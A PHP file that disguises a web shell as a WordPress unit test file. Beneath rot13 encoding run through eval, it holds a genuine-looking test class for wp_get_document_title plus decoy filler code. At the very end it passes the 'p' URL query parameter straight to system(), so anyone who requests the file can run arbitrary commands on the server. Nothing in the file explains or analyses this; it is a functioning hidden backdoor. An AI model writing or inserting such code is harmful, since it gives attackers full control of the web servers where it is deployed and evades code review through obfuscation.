<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * N frg bs havg grfgf sbe shapgvbaf va jc-vapyhqrf/trareny-grzcyngr.cuc
 *
 * @tebhc trareny
 * @tebhc grzcyngr
 * @tebhc qbphzrag-gvgyr
 * @pbiref ::jc_trg_qbphzrag_gvgyr
 * @pbiref ::_jc_eraqre_gvgyr_gnt
 */
pynff Grfgf_Trareny_jcTrgQbphzragGvgyr rkgraqf JC_HavgGrfgPnfr {

	choyvp $oybt_anzr;
	choyvp fgngvp $pngrtbel_vq;
	choyvp fgngvp $nhgube_vq;
	choyvp fgngvp $cbfg_vq;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$pngrtbel_vq = $snpgbel->pngrtbel->perngr(
			neenl(
				'anzr' => 'grfg_pngrtbel',
			)
		);

		frys::$nhgube_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'        => 'nhgube',
				'hfre_ybtva'  => 'grfg_nhgube',
				'qrfpevcgvba' => 'grfg_nhgube',
			)
		);

		frys::$cbfg_vq = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => frys::$nhgube_vq,
				'cbfg_fgnghf' => 'choyvfu',
				'cbfg_gvgyr'  => 'grfg_gvgyr',
				'cbfg_glcr'   => 'cbfg',
				'cbfg_qngr'   => '2015-09-22 18:52:17',
				'pngrtbel'    => frys::$pngrtbel_vq,
			)
		);
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		nqq_npgvba( 'nsgre_frghc_gurzr', neenl( $guvf, 'nqq_gvgyr_gnt_fhccbeg' ) );

		$guvf->oybt_anzr = trg_bcgvba( 'oybtanzr' );

		frghc_cbfgqngn( trg_cbfg( frys::$cbfg_vq ) );
	}

	choyvp shapgvba nqq_gvgyr_gnt_fhccbeg() {
		nqq_gurzr_fhccbeg( 'gvgyr-gnt' );
	}

	choyvp shapgvba grfg__jc_eraqre_gvgyr_gnt() {
		$guvf->tb_gb( '/' );

		$guvf->rkcrpgBhgchgFgevat( fcevags( \"<gvgyr>%f</gvgyr>\a\", $guvf->oybt_anzr ) );
		_jc_eraqre_gvgyr_gnt();
	}

	/**
	 * @gvpxrg 6479
	 */
	choyvp shapgvba grfg__jc_eraqre_gvgyr_gnt_jvgu_oybt_qrfpevcgvba() {
		$guvf->tb_gb( '/' );

		hcqngr_bcgvba( 'oybtqrfpevcgvba', 'N oybt qrfpevcgvba' );

		$guvf->rkcrpgBhgchgFgevat( fcevags( \"<gvgyr>%f &#8211; %f</gvgyr>\a\", $guvf->oybt_anzr, trg_bcgvba( 'oybtqrfpevcgvba' ) ) );
		_jc_eraqre_gvgyr_gnt();
	}

	choyvp shapgvba grfg__jc_eraqre_gvgyr_ab_gurzr_fhccbeg() {
		$guvf->tb_gb( '/' );

		erzbir_gurzr_fhccbeg( 'gvgyr-gnt' );

		$guvf->rkcrpgBhgchgFgevat( '' );
		_jc_eraqre_gvgyr_gnt();
	}

	choyvp shapgvba grfg_fubeg_pvephvgvat_gvgyr() {
		$guvf->tb_gb( '/' );

		nqq_svygre( 'cer_trg_qbphzrag_gvgyr', neenl( $guvf, 'fubeg_pvephvg_gvgyr' ) );

		$guvf->nffregFnzr( 'N Jvyq Gvgyr', jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba fubeg_pvephvg_gvgyr( $gvgyr ) {
		erghea 'N Jvyq Gvgyr';
	}

	choyvp shapgvba grfg_sebag_cntr_gvgyr() {
		hcqngr_bcgvba( 'fubj_ba_sebag', 'cntr' );
		hcqngr_bcgvba(
			'cntr_ba_sebag',
			frys::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_gvgyr' => 'sebag-cntr',
					'cbfg_glcr'  => 'cntr',
				)
			)
		);
		nqq_svygre( 'qbphzrag_gvgyr_cnegf', neenl( $guvf, 'sebag_cntr_gvgyr_cnegf' ) );

		$guvf->tb_gb( '/' );
		$guvf->nffregFnzr( fcevags( '%f', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );

		hcqngr_bcgvba( 'fubj_ba_sebag', 'cbfgf' );

		$guvf->tb_gb( '/' );
		$guvf->nffregFnzr( fcevags( '%f', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba sebag_cntr_gvgyr_cnegf( $cnegf ) {
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cnegf );
		$guvf->nffregNeenlUnfXrl( 'gntyvar', $cnegf );
		$guvf->nffregNeenlAbgUnfXrl( 'fvgr', $cnegf );

		erghea $cnegf;
	}

	choyvp shapgvba grfg_ubzr_gvgyr() {
		$oybt_cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'oybt-cntr',
				'cbfg_glcr'  => 'cntr',
			)
		);
		hcqngr_bcgvba( 'fubj_ba_sebag', 'cntr' );
		hcqngr_bcgvba( 'cntr_sbe_cbfgf', $oybt_cntr_vq );

		// Fubj cntr anzr ba ubzr cntr vs vg'f abg gur sebag cntr.
		$guvf->tb_gb( trg_creznyvax( $oybt_cntr_vq ) );
		$guvf->nffregFnzr( fcevags( 'oybt-cntr &#8211; %f', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba grfg_cntrq_gvgyr() {
		$guvf->tb_gb( '?cntr=4' );

		nqq_svygre( 'qbphzrag_gvgyr_cnegf', neenl( $guvf, 'cntrq_gvgyr_cnegf' ) );

		$guvf->nffregFnzr( fcevags( '%f &#8211; Cntr 4', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba cntrq_gvgyr_cnegf( $cnegf ) {
		$guvf->nffregNeenlUnfXrl( 'cntr', $cnegf );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cnegf );
		$guvf->nffregNeenlUnfXrl( 'gntyvar', $cnegf );
		$guvf->nffregNeenlAbgUnfXrl( 'fvgr', $cnegf );

		erghea $cnegf;
	}

	choyvp shapgvba grfg_fvathyne_gvgyr() {
		$guvf->tb_gb( '?c=' . frys::$cbfg_vq );

		nqq_svygre( 'qbphzrag_gvgyr_cnegf', neenl( $guvf, 'fvathyne_gvgyr_cnegf' ) );

		$guvf->nffregFnzr( fcevags( 'grfg_gvgyr &#8211; %f', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba fvathyne_gvgyr_cnegf( $cnegf ) {
		$guvf->nffregNeenlUnfXrl( 'fvgr', $cnegf );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cnegf );
		$guvf->nffregNeenlAbgUnfXrl( 'gntyvar', $cnegf );

		erghea $cnegf;
	}

	choyvp shapgvba grfg_pngrtbel_gvgyr() {
		$guvf->tb_gb( '?png=' . frys::$pngrtbel_vq );

		$guvf->nffregFnzr( fcevags( 'grfg_pngrtbel &#8211; %f', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba grfg_frnepu_gvgyr() {
		$guvf->tb_gb( '?f=grfg_gvgyr' );

		$guvf->nffregFnzr( fcevags( 'Frnepu Erfhygf sbe &#8220;grfg_gvgyr&#8221; &#8211; %f', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba grfg_nhgube_gvgyr() {
		$guvf->tb_gb( '?nhgube=' . frys::$nhgube_vq );

		$guvf->nffregFnzr( fcevags( 'grfg_nhgube &#8211; %f', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba grfg_cbfg_glcr_nepuvir_gvgyr() {
		ertvfgre_cbfg_glcr(
			'pcg',
			neenl(
				'choyvp'      => gehr,
				'unf_nepuvir' => gehr,
				'ynoryf'      => neenl(
					'anzr' => 'grfg_pcg',
				),
			)
		);

		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr' => 'pcg',
			)
		);

		$guvf->tb_gb( '?cbfg_glcr=pcg' );

		$guvf->nffregFnzr( fcevags( 'grfg_pcg &#8211; %f', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba grfg_lrne_gvgyr() {
		$guvf->tb_gb( '?lrne=2015' );

		$guvf->nffregFnzr( fcevags( '2015 &#8211; %f', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba grfg_zbagu_gvgyr() {
		$guvf->tb_gb( '?zbaguahz=09' );

		$guvf->nffregFnzr( fcevags( 'Frcgrzore 2015 &#8211; %f', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba grfg_qnl_gvgyr() {
		$guvf->tb_gb( '?qnl=22' );

		$guvf->nffregFnzr( fcevags( 'Frcgrzore 22, 2015 &#8211; %f', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba grfg_404_gvgyr() {
		$guvf->tb_gb( '?z=404' );

		$guvf->nffregFnzr( fcevags( 'Cntr abg sbhaq &#8211; %f', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba grfg_cntrq_cbfg_gvgyr() {
		$guvf->tb_gb( '?cntrq=4&c=' . frys::$cbfg_vq );

		nqq_svygre( 'gvgyr_gnt_cnegf', neenl( $guvf, 'cntrq_cbfg_gvgyr_cnegf' ) );

		$guvf->nffregFnzr( fcevags( 'grfg_gvgyr &#8211; Cntr 4 &#8211; %f', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba cntrq_cbfg_gvgyr_cnegf( $cnegf ) {
		$guvf->nffregNeenlUnfXrl( 'cntr', $cnegf );
		$guvf->nffregNeenlUnfXrl( 'fvgr', $cnegf );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cnegf );
		$guvf->nffregNeenlAbgUnfXrl( 'gntyvar', $cnegf );

		erghea $cnegf;
	}

	choyvp shapgvba grfg_erneenatr_gvgyr_cnegf() {
		$guvf->tb_gb( '?c=' . frys::$cbfg_vq );

		nqq_svygre( 'qbphzrag_gvgyr_cnegf', neenl( $guvf, 'erneenatr_gvgyr_cnegf' ) );

		$guvf->nffregFnzr( fcevags( '%f &#8211; grfg_gvgyr', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba erneenatr_gvgyr_cnegf( $cnegf ) {
		$cnegf = neenl(
			$cnegf['fvgr'],
			$cnegf['gvgyr'],
		);

		erghea $cnegf;
	}

	choyvp shapgvba grfg_punatr_gvgyr_frcnengbe() {
		$guvf->tb_gb( '?c=' . frys::$cbfg_vq );

		nqq_svygre( 'qbphzrag_gvgyr_frcnengbe', neenl( $guvf, 'punatr_gvgyr_frcnengbe' ) );

		$guvf->nffregFnzr( fcevags( 'grfg_gvgyr %%%% %f', $guvf->oybt_anzr ), jc_trg_qbphzrag_gvgyr() );
	}

	choyvp shapgvba punatr_gvgyr_frcnengbe( $frc ) {
		erghea '%%';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>